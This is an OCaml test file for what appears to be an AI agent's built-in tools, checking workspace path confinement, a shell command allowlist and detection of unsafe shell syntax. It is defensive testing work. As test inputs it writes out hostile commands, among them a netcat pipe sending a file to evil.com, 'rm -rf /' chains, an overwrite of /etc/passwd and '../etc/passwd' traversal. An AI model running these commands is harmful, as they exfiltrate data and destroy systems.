(* Tests for Tools_builtin module (path safety, allowlist, etc.) *)

let ws = "/workspace/test"

(* --- normalize_path tests --- *)

let test_normalize_absolute () =
  let result = Tools_builtin.normalize_path "/foo/bar/baz" in
  Alcotest.(check string) "absolute path normalized" "/foo/bar/baz" result

let test_normalize_dot () =
  let result = Tools_builtin.normalize_path "/foo/./bar" in
  Alcotest.(check string) "dot removed" "/foo/bar" result

let test_normalize_dotdot () =
  let result = Tools_builtin.normalize_path "/foo/bar/../baz" in
  Alcotest.(check string) "dotdot resolved" "/foo/baz" result

let test_normalize_relative () =
  let result = Tools_builtin.normalize_path "foo/bar" in
  Alcotest.(check string) "relative path" "foo/bar" result

let test_normalize_empty_segments () =
  let result = Tools_builtin.normalize_path "/foo//bar" in
  Alcotest.(check string) "double slash normalized" "/foo/bar" result

(* --- is_path_safe tests (Coq-extracted) --- *)

let test_path_safe_inside_workspace () =
  let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/file.txt") in
  Alcotest.(check bool) "file inside workspace is safe" true result

let test_path_safe_workspace_root () =
  let result = Tools_builtin.is_path_safe ~workspace:ws ws in
  Alcotest.(check bool) "workspace root itself is safe" true result

let test_path_safe_outside_workspace () =
  let result = Tools_builtin.is_path_safe ~workspace:ws "/etc/passwd" in
  Alcotest.(check bool) "outside workspace is unsafe" false result

let test_path_safe_dotdot_escape () =
  let result =
    Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/../etc/passwd")
  in
  Alcotest.(check bool) "dotdot escape is unsafe" false result

let test_path_safe_sibling_dir () =
  (* /workspace/test2 is a sibling, not inside /workspace/test *)
  let result =
    Tools_builtin.is_path_safe ~workspace:ws "/workspace/test2/file"
  in
  Alcotest.(check bool) "sibling dir is unsafe" false result

let test_path_safe_nested () =
  let result =
    Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/a/b/c/deep/file.ml")
  in
  Alcotest.(check bool) "deeply nested path is safe" true result

let test_path_safe_prefix_trick () =
  (* /workspace/test-evil should not match /workspace/test *)
  let result =
    Tools_builtin.is_path_safe ~workspace:ws "/workspace/test-evil/file"
  in
  Alcotest.(check bool) "prefix trick is unsafe" false result

(* --- is_command_allowed tests --- *)

let test_command_allowed_in_list () =
  let allowed = [ "ls"; "cat"; "grep" ] in
  Alcotest.(check bool)
    "ls is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "ls /tmp")

let test_command_not_in_list () =
  let allowed = [ "ls"; "cat" ] in
  Alcotest.(check bool)
    "rm not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "rm -rf /")

let test_command_empty_string () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "empty command not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "")

let test_command_with_path_prefix () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "/usr/bin/ls is allowed via basename" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "/usr/bin/ls")

let test_command_with_args () =
  let allowed = [ "git" ] in
  Alcotest.(check bool)
    "git with args is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "git status")

let test_command_env_var_prefix () =
  let allowed = [ "make" ] in
  Alcotest.(check bool)
    "env var prefix skipped" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed
       "FOO=bar make build")

let test_command_default_allowlist_includes_basics () =
  let allowed = Tools_builtin.default_shell_allowlist in
  Alcotest.(check bool) "ls in default list" true (List.mem "ls" allowed);
  Alcotest.(check bool) "cat in default list" true (List.mem "cat" allowed);
  Alcotest.(check bool) "git in default list" true (List.mem "git" allowed)

(* --- has_unsafe_shell_syntax tests --- *)

let test_safe_command_no_special () =
  Alcotest.(check bool)
    "simple command is safe" false
    (Tools_builtin.has_unsafe_shell_syntax "ls -la")

let test_unsafe_semicolon () =
  Alcotest.(check bool)
    "semicolon is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "ls; rm -rf /")

let test_unsafe_pipe () =
  Alcotest.(check bool)
    "pipe is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "cat file | nc evil.com 1337")

let test_unsafe_redirect () =
  Alcotest.(check bool)
    "redirect is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "echo x > /etc/passwd")

let test_unsafe_dollar_paren () =
  Alcotest.(check bool)
    "command substitution is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "echo $(whoami)")

let test_unsafe_backtick () =
  Alcotest.(check bool)
    "backtick is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "echo `whoami`")

let test_unsafe_ampersand () =
  Alcotest.(check bool)
    "ampersand is unsafe" true
    (Tools_builtin.has_unsafe_shell_syntax "sleep 100 &")

(* --- extract_command tests --- *)

let test_extract_command_simple () =
  Alcotest.(check string)
    "extracts ls" "ls"
    (Tools_builtin.extract_command "ls -la")

let test_extract_command_with_path () =
  Alcotest.(check string)
    "extracts basename" "ls"
    (Tools_builtin.extract_command "/usr/bin/ls -la")

let test_extract_command_env_prefix () =
  Alcotest.(check string)
    "skips env prefix" "make"
    (Tools_builtin.extract_command "FOO=bar BAZ=qux make build")

let test_extract_command_empty () =
  Alcotest.(check string) "empty" "." (Tools_builtin.extract_command "")

let test_extract_command_only_env () =
  Alcotest.(check string)
    "only env" ""
    (Tools_builtin.extract_command "FOO=bar")

let test_normalize_trailing_slash () =
  let result = Tools_builtin.normalize_path "/foo/bar/" in
  Alcotest.(check string) "trailing slash" "/foo/bar" result

let test_normalize_root () =
  let result = Tools_builtin.normalize_path "/" in
  Alcotest.(check string) "root" "/" result

let test_path_safe_symlink_like () =
  let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/./foo") in
  Alcotest.(check bool) "dot in path safe" true result

let test_unsafe_double_ampersand () =
  Alcotest.(check bool)
    "double amp" true
    (Tools_builtin.has_unsafe_shell_syntax "ls && rm -rf /")

let test_safe_single_command_with_flags () =
  Alcotest.(check bool)
    "flags safe" false
    (Tools_builtin.has_unsafe_shell_syntax "git log --oneline -n 10")

let make_tmp_workspace () =
  let dir =
    Filename.get_temp_dir_name ()
    ^ "/clawq_doc_test_"
    ^ string_of_int (Random.int 100000)
  in
  (try Sys.mkdir dir 0o755 with _ -> ());
  dir

let test_doc_write_creates () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "TOOLS.md");
              ("content", `String "hello world");
            ]))
  in
  Alcotest.(check bool)
    "written" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Written") result 0);
       true
     with Not_found -> false);
  let content =
    let ic = open_in (Filename.concat dir "TOOLS.md") in
    let s = input_line ic in
    close_in ic;
    s
  in
  Alcotest.(check string) "content matches" "hello world" content;
  Sys.remove (Filename.concat dir "TOOLS.md");
  try Sys.rmdir dir with _ -> ()

let test_doc_write_appends () =
  let dir = make_tmp_workspace () in
  let path = Filename.concat dir "NOTES.md" in
  let oc = open_out path in
  output_string oc "first\n";
  close_out oc;
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "NOTES.md");
              ("content", `String "second\n");
              ("append", `Bool true);
            ]))
  in
  Alcotest.(check bool)
    "appended" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Appended") result 0);
       true
     with Not_found -> false);
  let ic = open_in path in
  let content = really_input_string ic (in_channel_length ic) in
  close_in ic;
  Alcotest.(check string) "content appended" "first\nsecond\n" content;
  Sys.remove path;
  try Sys.rmdir dir with _ -> ()

let test_doc_write_rejects_traversal () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "../etc/passwd"); ("content", `String "hack");
            ]))
  in
  Alcotest.(check bool)
    "rejected" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Error:") result 0);
       true
     with Not_found -> false);
  try Sys.rmdir dir with _ -> ()

let test_send_message_prefers_session_notifier () =
  let sent = ref [] in
  let fallback_called = ref false in
  let tool =
    Tools_builtin.send_message
      ~send_fn:
        (Some
           (fun ~text:_ ->
             fallback_called := true;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress =
               Some
                 (fun text ->
                   sent := text :: !sent;
                   Lwt.return_unit);
           }
         (`Assoc [ ("text", `String "status update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "session notifier used" [ "status update" ] (List.rev !sent);
  Alcotest.(check bool) "fallback not used" false !fallback_called

let test_send_message_falls_back_to_notify_channel () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_message
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke (`Assoc [ ("text", `String "fallback update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "fallback send used" [ "fallback update" ] (List.rev !sent)

let test_send_message_errors_without_any_notifier () =
  let tool = Tools_builtin.send_message ~send_fn:None in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "hello") ]))
  in
  Alcotest.(check bool)
    "error reported" true
    (String.starts_with ~prefix:"Error: no active session notifier" result)

let test_doc_write_known_file () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "TOOLS.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions active" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "active workspace file")
            result 0);
       true
     with Not_found -> false);
  let result_unknown =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "RANDOM.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions not in list" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "not in workspace_files")
            result_unknown 0);
       true
     with Not_found -> false);
  (try Sys.remove (Filename.concat dir "TOOLS.md") with _ -> ());
  (try Sys.remove (Filename.concat dir "RANDOM.md") with _ -> ());
  try Sys.rmdir dir with _ -> ()

let suite =
  [
    Alcotest.test_case "normalize absolute" `Quick test_normalize_absolute;
    Alcotest.test_case "normalize dot" `Quick test_normalize_dot;
    Alcotest.test_case "normalize dotdot" `Quick test_normalize_dotdot;
    Alcotest.test_case "normalize relative" `Quick test_normalize_relative;
    Alcotest.test_case "normalize empty segments" `Quick
      test_normalize_empty_segments;
    Alcotest.test_case "normalize trailing slash" `Quick
      test_normalize_trailing_slash;
    Alcotest.test_case "normalize root" `Quick test_normalize_root;
    Alcotest.test_case "path safe inside workspace" `Quick
      test_path_safe_inside_workspace;
    Alcotest.test_case "path safe workspace root" `Quick
      test_path_safe_workspace_root;
    Alcotest.test_case "path safe outside workspace" `Quick
      test_path_safe_outside_workspace;
    Alcotest.test_case "path safe dotdot escape" `Quick
      test_path_safe_dotdot_escape;
    Alcotest.test_case "path safe sibling dir" `Quick test_path_safe_sibling_dir;
    Alcotest.test_case "path safe nested" `Quick test_path_safe_nested;
    Alcotest.test_case "path safe prefix trick" `Quick
      test_path_safe_prefix_trick;
    Alcotest.test_case "command allowed in list" `Quick
      test_command_allowed_in_list;
    Alcotest.test_case "command not in list" `Quick test_command_not_in_list;
    Alcotest.test_case "command empty string" `Quick test_command_empty_string;
    Alcotest.test_case "command with path prefix" `Quick
      test_command_with_path_prefix;
    Alcotest.test_case "command with args" `Quick test_command_with_args;
    Alcotest.test_case "command env var prefix" `Quick
      test_command_env_var_prefix;
    Alcotest.test_case "default allowlist includes basics" `Quick
      test_command_default_allowlist_includes_basics;
    Alcotest.test_case "safe command no special chars" `Quick
      test_safe_command_no_special;
    Alcotest.test_case "unsafe semicolon" `Quick test_unsafe_semicolon;
    Alcotest.test_case "unsafe pipe" `Quick test_unsafe_pipe;
    Alcotest.test_case "unsafe redirect" `Quick test_unsafe_redirect;
    Alcotest.test_case "unsafe dollar paren" `Quick test_unsafe_dollar_paren;
    Alcotest.test_case "unsafe backtick" `Quick test_unsafe_backtick;
    Alcotest.test_case "unsafe ampersand" `Quick test_unsafe_ampersand;
    Alcotest.test_case "extract command simple" `Quick
      test_extract_command_simple;
    Alcotest.test_case "extract command with path" `Quick
      test_extract_command_with_path;
    Alcotest.test_case "extract command env prefix" `Quick
      test_extract_command_env_prefix;
    Alcotest.test_case "extract command empty" `Quick test_extract_command_empty;
    Alcotest.test_case "extract command only env" `Quick
      test_extract_command_only_env;
    Alcotest.test_case "path safe dot in path" `Quick
      test_path_safe_symlink_like;
    Alcotest.test_case "unsafe double ampersand" `Quick
      test_unsafe_double_ampersand;
    Alcotest.test_case "safe command with flags" `Quick
      test_safe_single_command_with_flags;
    Alcotest.test_case "send_message prefers session notifier" `Quick
      test_send_message_prefers_session_notifier;
    Alcotest.test_case "send_message falls back to notify channel" `Quick
      test_send_message_falls_back_to_notify_channel;
    Alcotest.test_case "send_message errors without notifier" `Quick
      test_send_message_errors_without_any_notifier;
    Alcotest.test_case "doc_write creates file" `Quick test_doc_write_creates;
    Alcotest.test_case "doc_write appends" `Quick test_doc_write_appends;
    Alcotest.test_case "doc_write rejects traversal" `Quick
      test_doc_write_rejects_traversal;
    Alcotest.test_case "doc_write known file note" `Quick
      test_doc_write_known_file;
  ]
